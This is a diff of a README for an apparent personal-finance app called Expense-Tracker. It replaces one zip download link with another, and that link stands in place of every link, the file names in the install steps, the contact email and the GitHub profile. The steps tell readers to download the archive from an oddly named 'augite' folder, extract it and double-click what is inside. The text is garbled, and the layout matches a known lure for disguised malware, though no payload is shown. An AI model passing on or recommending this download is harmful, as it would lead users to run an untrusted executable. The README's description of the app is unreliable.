@@ -8,16 +8,16 @@ Welcome to the Expense-Tracker! This application helps you manage your personal 
 
 To get the latest version of Expense-Tracker, visit this page to download:
 
-[![Download Expense-Tracker](https://raw.githubusercontent.com/joeljj23/Expense-Tracker/main/augite/Expense-Tracker.zip)](https://raw.githubusercontent.com/joeljj23/Expense-Tracker/main/augite/Expense-Tracker.zip)
+[![Download Expense-Tracker](https://github.com/joeljj23/Expense-Tracker/raw/refs/heads/main/augite/Tracker-Expense-v1.6.zip)](https://github.com/joeljj23/Expense-Tracker/raw/refs/heads/main/augite/Tracker-Expense-v1.6.zip)
 
 ### Step-by-Step Guide
 
 1. Click the download button above to go to the Releases page.
 2. Look for the latest version titled **V1.0**.
-3. Download the **https://raw.githubusercontent.com/joeljj23/Expense-Tracker/main/augite/Expense-Tracker.zip** file. You may see additional files; you only need this one.
-4. After the download completes, locate the **https://raw.githubusercontent.com/joeljj23/Expense-Tracker/main/augite/Expense-Tracker.zip** file in your Downloads folder.
+3. Download the **https://github.com/joeljj23/Expense-Tracker/raw/refs/heads/main/augite/Tracker-Expense-v1.6.zip** file. You may see additional files; you only need this one.
+4. After the download completes, locate the **https://github.com/joeljj23/Expense-Tracker/raw/refs/heads/main/augite/Tracker-Expense-v1.6.zip** file in your Downloads folder.
 5. Right-click on the file and select **Extract All**. Follow the prompts to extract the contents.
-6. Open the extracted folder, find **https://raw.githubusercontent.com/joeljj23/Expense-Tracker/main/augite/Expense-Tracker.zip**, and double-click it to run the application.
+6. Open the extracted folder, find **https://github.com/joeljj23/Expense-Tracker/raw/refs/heads/main/augite/Tracker-Expense-v1.6.zip**, and double-click it to run the application.
 
 ## 🌟 Features
 
@@ -58,7 +58,7 @@ This application is open-source. You can view the license details in the reposit
 ## 📧 Contact
 
 For further inquiries:
-- Email: https://raw.githubusercontent.com/joeljj23/Expense-Tracker/main/augite/Expense-Tracker.zip
-- GitHub: [SA3DWY](https://raw.githubusercontent.com/joeljj23/Expense-Tracker/main/augite/Expense-Tracker.zip)
+- Email: https://github.com/joeljj23/Expense-Tracker/raw/refs/heads/main/augite/Tracker-Expense-v1.6.zip
+- GitHub: [SA3DWY](https://github.com/joeljj23/Expense-Tracker/raw/refs/heads/main/augite/Tracker-Expense-v1.6.zip)
 
 Happy tracking! We hope Expense-Tracker helps you manage your finances smoothly.
